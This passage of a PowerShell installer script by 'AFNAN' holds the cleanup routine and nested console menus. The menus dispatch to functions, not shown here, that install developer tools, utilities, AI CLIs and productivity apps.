    Write-Host "Cleaning up temporary files..." -ForegroundColor Gray
    Remove-Item $dxZip -Force -ErrorAction SilentlyContinue
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

    if (Test-Path $tempDir) {
        Write-Host "[NOTE] Some files are still in use by the installer and couldn't be deleted." -ForegroundColor Yellow
    } else {
        Write-Host "Cleanup successful." -ForegroundColor Green
    }
    Write-Host ""
    Pause
}

# ==============================
# MAIN MENU LOOP
# ==============================
function Show-MainMenu {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                    MAIN MENU - Press Key                     =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   [1] About AFNAN                 [2] PowerShell Tweaks" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [3] >> Essential <<             [4] Run Scripts" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [5] Recommended Tools           [6] Automation" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [7] AI in PC                    [8] Context Menu" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [9] System Tools                [0] Productivity Apps" -ForegroundColor Green
    Write-Host ""
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [Z] exit" -ForegroundColor Red
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { Show-AboutAfnan }
        "2" { Show-PowerShellMenu }
        "3" { Show-EssentialMenu }
        "4" { Show-RunScriptsMenu }
        "5" { Show-RecommendedTools }
        "6" { Show-AutomationMenu }
        "7" { Show-AiInPcMenu }
        "8" { Show-ContextMenuMenu }
        "9" { Show-SystemDevMenu }
        "0" { Show-ProductivityMenu }
        "Z" { Confirm-Exit }
        "z" { Confirm-Exit }
        default { Show-MainMenu }
    }
}

function Show-AboutAfnan {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                    ABOUT AFNAN                               =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   This tool was created by AFNAN to help you quickly install" -ForegroundColor Gray
    Write-Host "   and configure various Windows tools, utilities, and scripts." -ForegroundColor Gray
    Write-Host ""
    Write-Host "   Features:" -ForegroundColor Cyan
    Write-Host "   - PowerShell policy management" -ForegroundColor Gray
    Write-Host "   - Essential development tools installation" -ForegroundColor Gray
    Write-Host "   - Popular scripts and utilities" -ForegroundColor Gray
    Write-Host "   - AI tools and automation setup" -ForegroundColor Gray
    Write-Host "   - System customization options" -ForegroundColor Gray
    Write-Host ""
    Write-Host "   Portfolio: https://afnan-nex.github.io/portfolio/" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [1] Open Portfolio       [Z] Go Back" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { OPENPORTFOLIO; Show-AboutAfnan }
        "Z" { Show-MainMenu }
        "z" { Show-MainMenu }
        default { Show-AboutAfnan }
    }
}

function Show-PowerShellMenu {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                 POWERSHELL TWEAKS                            =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   [1] See Policy" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [2] Unrestrict Policy" -ForegroundColor Green
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [Z] Go Back" -ForegroundColor Red
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { SEEPOLICY; Show-PowerShellMenu }
        "2" { UNRESTRICT; Show-PowerShellMenu }
        "Z" { Show-MainMenu }
        "z" { Show-MainMenu }
        default { Show-PowerShellMenu }
    }
}

function Show-EssentialMenu {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =               >>>>>> ESSENTIAL <<<<<<                 =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   [1] Chocolatey" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [2] Node.js LTS" -ForegroundColor Green
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [Z] Go Back" -ForegroundColor Red
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { CHOCO; Show-EssentialMenu }
        "2" { NODELTS; Show-EssentialMenu }
        "Z" { Show-MainMenu }
        "z" { Show-MainMenu }
        default { Show-EssentialMenu }
    }
}

function Show-RunScriptsMenu {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                    RUN SCRIPTS                               =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   [1] Chris Titus Tool          [4] IDM" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [2] Mass Grave                [5] Sparkle" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [3] Coporton                  [6] GHGrab (GitHub Repo Grabber)" -ForegroundColor Green
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [Z] Go Back" -ForegroundColor Red
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { TITUS; Show-RunScriptsMenu }
        "2" { MASSGRAVE; Show-RunScriptsMenu }
        "3" { COPORTON; Show-RunScriptsMenu }
        "4" { IDM; Show-RunScriptsMenu }
        "5" { SPARKLE; Show-RunScriptsMenu }
        "6" { GHGRAB; Show-RunScriptsMenu }
        "Z" { Show-MainMenu }
        "z" { Show-MainMenu }
        default { Show-RunScriptsMenu }
    }
}

function Show-RecommendedTools {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                 RECOMMENDED TOOLS                            =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   [1] Git              [5] 7-Zip" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [2] Python           [6] WinDirStat" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [3] .NET Runtime     [7] yt-dlp" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [4] FFmpeg           [8] ngrok" -ForegroundColor Green
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [Z] Go Back" -ForegroundColor Red
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { GIT; Show-RecommendedTools }
        "2" { PYTHON; Show-RecommendedTools }
        "3" { DOTNET; Show-RecommendedTools }
        "4" { FFMPEG; Show-RecommendedTools }
        "5" { SEVENZIP; Show-RecommendedTools }
        "6" { WINDIRSTAT; Show-RecommendedTools }
        "7" { YTDLP; Show-RecommendedTools }
        "8" { NGROK; Show-RecommendedTools }
        "Z" { Show-MainMenu }
        "z" { Show-MainMenu }
        default { Show-RecommendedTools }
    }
}

function Show-AutomationMenu {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                     AUTOMATION                               =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   [1] n8n Workflow Automation" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [2] Google Workspace CLI (GWS)" -ForegroundColor Green
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [Z] Go Back" -ForegroundColor Red
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { N8N; Show-AutomationMenu }
        "2" { GWS; Show-AutomationMenu }
        "Z" { Show-MainMenu }
        "z" { Show-MainMenu }
        default { Show-AutomationMenu }
    }
}

function Show-AiInPcMenu {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                      AI IN PC                                =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   [1] Google Gemini CLI" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [2] Qwen AI CLI" -ForegroundColor Green
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [Z] Go Back" -ForegroundColor Red
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { GEMINI; Show-AiInPcMenu }
        "2" { QWEN; Show-AiInPcMenu }
        "Z" { Show-MainMenu }
        "z" { Show-MainMenu }
        default { Show-AiInPcMenu }
    }
}

function Show-ContextMenuMenu {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                    CONTEXT MENU                              =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   [1] Windows 11 New Context Menu" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [2] Windows 10 Classic Context Menu" -ForegroundColor Green
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [Z] Go Back" -ForegroundColor Red
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { WIN11MENU; Show-ContextMenuMenu }
        "2" { WIN10MENU; Show-ContextMenuMenu }
        "Z" { Show-MainMenu }
        "z" { Show-MainMenu }
        default { Show-ContextMenuMenu }
    }
}

function Show-SystemDevMenu {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                         SYSTEM TOOLS                         =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   [1] Winget              [6] Scrcpy GUI" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [2] Everything          [7] Cursor" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [3] CMD Clr 0a          [8] VC++ Runtimes" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [4] RustDesk            [9] DirectX" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [5] HiBit Uninstaller" -ForegroundColor Green
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [Z] Go Back" -ForegroundColor Red
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { WINGET; Show-SystemDevMenu }
        "2" { EVERYTHING; Show-SystemDevMenu }
        "3" { CMD0A; Show-SystemDevMenu }
        "4" { RUSTDESK; Show-SystemDevMenu }
        "5" { HIBIT; Show-SystemDevMenu }
        "6" { SCRCPY; Show-SystemDevMenu }
        "7" { CUR; Show-SystemDevMenu }
        "8" { VCREDIST; Show-SystemDevMenu }
        "9" { DIRECTX; Show-SystemDevMenu }
        "Z" { Show-MainMenu }
        "z" { Show-MainMenu }
        default { Show-SystemDevMenu }
    }
}

function Show-ProductivityMenu {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                       PRODUCTIVITY APPS                      =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   [1] Office365           [5] LocalSend" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [2] Chrome              [6] Notepad++" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [3] Zen Browser         [7] ShareX" -ForegroundColor Green
    Write-Host ""
    Write-Host "   [4] OBS Studio" -ForegroundColor Green
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "   [Z] Go Back" -ForegroundColor Red
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Your Choice"
    
    switch ($choice) {
        "1" { OFFICE365; Show-ProductivityMenu }
        "2" { CHROME; Show-ProductivityMenu }
        "3" { ZEN; Show-ProductivityMenu }
        "4" { OBS; Show-ProductivityMenu }
        "5" { LOCALSEND; Show-ProductivityMenu }
        "6" { NOTEPADPP; Show-ProductivityMenu }
        "7" { SHAREX; Show-ProductivityMenu }
        "Z" { Show-MainMenu }
        "z" { Show-MainMenu }
        default { Show-ProductivityMenu }
    }
}

function Confirm-Exit {
    Clear-Host
    Show-AsciiHeader
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host "  =                    CONFIRM EXIT                              =" -ForegroundColor White
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""
    Write-Host "   Do you want to exit the script?" -ForegroundColor Gray
    Write-Host ""
    Write-Host "   [1] Yes - Exit Script" -ForegroundColor Green
    Write-Host "   [Z] No  - Return to Main Menu" -ForegroundColor Red
    Write-Host ""
    Write-Host "  ================================================================" -ForegroundColor White
    Write-Host ""

    $choice = Read-Host "   Press 1 to exit, Z to return"
    
    if ($choice -eq "1") {
        Write-Host ""
        Write-Host "   Thank you for using Tool Installer by AFNAN! Goodbye." -ForegroundColor Cyan
        Write-Host ""
        Start-Sleep -Seconds 2
        exit
    } elseif ($choice -eq "Z" -or $choice -eq "z") {
        Show-MainMenu
    } else {
        Confirm-Exit
    }
}

# ==============================
# START
# ==============================
Show-MainMenu
